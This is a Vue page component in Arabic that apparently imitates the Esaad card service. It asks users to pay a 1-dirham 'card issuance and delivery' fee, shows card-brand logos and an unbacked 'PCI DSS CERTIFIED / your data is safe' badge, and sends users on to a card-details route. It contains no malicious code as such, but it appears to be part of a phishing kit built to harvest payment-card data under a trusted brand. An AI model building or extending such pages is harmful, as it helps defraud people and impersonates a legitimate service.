<script setup lang="ts">
import { useRouter } from 'vue-router';
import { ChevronLeft, ArrowRight, ShieldCheck } from 'lucide-vue-next';

const router = useRouter();

const goNext = () => {
  router.push('/card-details');
};

const goBack = () => {
  router.push('/request');
};
</script>

<template>
  <div dir="rtl" class="max-w-xl mx-auto bg-[#eef5f0] min-h-screen flex flex-col font-sans text-gray-900 relative overflow-hidden">
    
    <!-- Esaad Top Dark Header -->
    <header class="w-full bg-[#040c06] px-4 py-3 flex items-center justify-between border-b border-[#009a44]/30 relative z-20">
      <button
        @click="goBack"
        aria-label="العودة"
        class="w-8 h-8 rounded-full bg-white/10 hover:bg-white/20 flex items-center justify-center text-white transition-colors cursor-pointer"
      >
        <ArrowRight class="w-4 h-4" />
      </button>

      <!-- Esaad Logo -->
      <div @click="router.push('/')" class="cursor-pointer flex flex-col items-center select-none">
        <div class="text-[#39b54a] font-black text-base leading-none tracking-tight">إسعاد</div>
        <div class="text-[#39b54a] font-extrabold text-sm leading-none -mt-0.5 tracking-tight">esaad</div>
        <svg class="w-10 h-3 -mt-0.5" viewBox="0 0 60 18" fill="none">
          <circle cx="14" cy="4" r="2" fill="#39b54a" />
          <circle cx="46" cy="4" r="2" fill="#39b54a" />
          <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" fill="none" />
        </svg>
      </div>

      <div class="w-8"></div>
    </header>

    <div class="flex-1 flex flex-col items-center pt-6 px-5 pb-8">
      <!-- Title Banner (Minimized Font Size) -->
      <div class="bg-[#07170b] text-white py-2.5 px-5 text-center text-sm font-bold mb-6 w-full max-w-sm rounded-xl shadow-sm border border-[#009a44]/40 relative z-10">
        دفع رسوم إصدار وتوصيل بطاقة إسعاد
      </div>

      <!-- Fees Box in Esaad Dark Emerald Style (Minimized Font Size) -->
      <div class="bg-gradient-to-b from-[#071c0d] to-[#041007] text-white w-full max-w-sm rounded-2xl relative mt-3 mb-6 shadow-lg border border-[#009a44]/40 z-10 overflow-visible">
        
        <!-- Overlapping Tab -->
        <div class="absolute -top-3.5 left-1/2 transform -translate-x-1/2 bg-[#009a44] text-white px-7 py-1 font-bold text-xs rounded-full shadow-sm z-20">
          ملخص الرسوم
        </div>

        <div class="pt-8 pb-5 px-5 space-y-3.5">
          <!-- Row 1 -->
          <div class="flex justify-between items-center text-xs">
            <div class="text-right flex-1 text-gray-300 font-medium">رسوم تأكيد وإصدار الطلب</div>
            <div class="text-left font-bold tabular-nums">1 درهم</div>
          </div>
          
          <div class="h-px w-full bg-white/10"></div>
          
          <!-- Row 2 -->
          <div class="flex justify-between items-center text-xs">
            <div class="text-right flex-1 text-gray-300 font-medium">رسوم التوصيل الإضافية</div>
            <div class="text-left font-bold tabular-nums">0 درهم</div>
          </div>
          
          <div class="h-px w-full bg-white/10"></div>

          <!-- Row 3 - Total -->
          <div class="flex justify-between items-center text-sm pt-0.5">
            <div class="text-right flex-1 font-bold text-white">المجموع الكلي</div>
            <div class="text-left font-bold text-[#39b54a] tabular-nums">1 درهم</div>
          </div>
        </div>
      </div>

      <!-- Cards Banner -->
      <div class="bg-white text-gray-800 w-full max-w-sm flex items-center justify-between p-2.5 rounded-xl mb-6 border border-gray-200 shadow-xs relative z-10">
        <div class="text-right pr-2 font-bold flex-1 text-gray-800 text-xs">
          الدفع الإلكتروني عبر البطاقة
        </div>
        <div class="bg-gray-50 p-1 rounded-lg flex items-center gap-1.5 border border-gray-100" dir="ltr">
          <div class="w-[32px] h-[20px] bg-gradient-to-br from-blue-500 to-blue-700 text-[4.5px] text-white font-bold flex items-center justify-center leading-tight text-center rounded-[3px]">AMERICAN<br/>EXPRESS</div>
          <div class="w-[32px] h-[20px] bg-gradient-to-br from-blue-700 to-blue-900 text-[8px] text-white font-bold flex items-center justify-center italic rounded-[3px]">VISA</div>
          <div class="w-[32px] h-[20px] bg-white border border-gray-200 flex items-center justify-center relative overflow-hidden rounded-[3px]">
            <div class="w-[14px] h-[14px] bg-[#eb001b] rounded-full absolute -left-1 opacity-90"></div>
            <div class="w-[14px] h-[14px] bg-[#f79e1b] rounded-full absolute -right-1 opacity-90"></div>
            <span class="text-[4.5px] font-bold z-10 text-gray-900">MasterCard</span>
          </div>
        </div>
      </div>

      <!-- Submit Button (Minimized Font Size) -->
      <button
        @click="goNext"
        class="bg-[#008a40] hover:bg-[#007335] text-white py-3 px-10 rounded-xl flex items-center justify-center gap-2 mb-8 w-full max-w-sm shadow-md transition-colors cursor-pointer group"
      >
        <span class="font-bold text-sm">متابعة الدفع</span>
        <ChevronLeft class="w-4 h-4 transform group-hover:-translate-x-1 transition-transform" />
      </button>

      <!-- Footer Security Info -->
      <div class="text-center max-w-sm px-2 mt-auto">
        <p class="text-gray-600 font-medium text-[11px] leading-relaxed mb-3">
          تُقبل البطاقات العالمية والبطاقات الصادرة في دولة الإمارات العربية المتحدة ودول الخليج.
        </p>
        <div class="flex items-center justify-center gap-2.5 bg-white py-2 px-3.5 rounded-xl border border-gray-200 shadow-xs">
          <ShieldCheck class="w-4 h-4 text-[#008a40] shrink-0" />
          <div class="text-[#008a40] font-bold text-xs tracking-tight" dir="ltr">
            PCI DSS CERTIFIED
          </div>
          <div class="w-px h-3.5 bg-gray-300"></div>
          <div class="text-gray-700 font-semibold text-[11px]">بياناتك الخاصة آمنة</div>
        </div>
      </div>
    </div>

    <!-- Esaad Footer -->
    <footer class="bg-[#e4f2ea] px-5 py-4 text-right border-t border-gray-200/60">
      <div class="flex items-center justify-between">
        <div class="flex flex-col items-center">
          <span class="text-[#008a40] font-black text-xs leading-none">إسعاد</span>
          <span class="text-gray-900 font-extrabold text-[10px] leading-none">esaad</span>
        </div>
        <span class="text-[11px] text-gray-600 font-medium">© 2026 esaad, كل الحقوق محفوظة.</span>
      </div>
    </footer>

  </div>
</template>
